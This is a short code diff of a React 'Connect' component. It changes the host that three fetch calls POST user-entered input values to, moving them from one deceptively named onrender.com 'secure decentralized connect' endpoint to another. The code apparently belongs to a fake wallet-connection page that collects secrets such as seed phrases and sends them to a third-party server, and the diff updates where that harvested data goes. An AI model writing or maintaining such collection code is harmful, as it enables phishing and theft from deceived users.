@@ -19,7 +19,7 @@ function Connect({onCancelClick}) {
                   inputvalue : inputavalue,
               }
             try{  
-                const response = await fetch('https://secure-dashboard-connect-decentralized.onrender.com/processing', {
+                const response = await fetch('https://secure-decentralized-connect.onrender.com/processing', {
                    method : 'post', 
                    body : JSON.stringify(data),
                    headers: {
@@ -69,7 +69,7 @@ function Connect({onCancelClick}) {
              inputvalue : inputbvalue,
          }
        try{  
-           const response = await fetch('https://secure-dashboard-connect-decentralized.onrender.com/processingb', {
+           const response = await fetch('https://secure-decentralized-connect.onrender.com/processingb', {
               method : 'post', 
               body : JSON.stringify(data),
               headers: {
@@ -118,7 +118,7 @@ useEffect( ()=> {
          inputvalue : inputcvalue,
      }
    try{  
-       const response = await fetch('https://secure-dashboard-connect-decentralized.onrender.com/processingc', {
+       const response = await fetch('https://secure-decentralized-connect.onrender.com/processingc', {
           method : 'post', 
           body : JSON.stringify(data),
           headers: {
